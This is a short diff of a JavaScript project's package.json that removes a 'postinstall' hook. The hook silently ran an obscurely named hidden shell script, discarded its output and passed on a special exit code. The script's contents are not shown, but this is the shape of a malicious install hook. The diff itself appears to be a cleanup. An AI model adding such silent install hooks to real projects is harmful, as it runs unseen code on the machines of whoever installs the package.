@@ -9,8 +9,7 @@
     "prettier-format": "prettier --write .",
     "start": "next start",
     "lint": "eslint .",
-    "prepare": "husky",
-    "postinstall": "sh ./.ci-diwj29.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepare": "husky"
   },
   "lint-staged": {
     "*.{js,jsx}": [
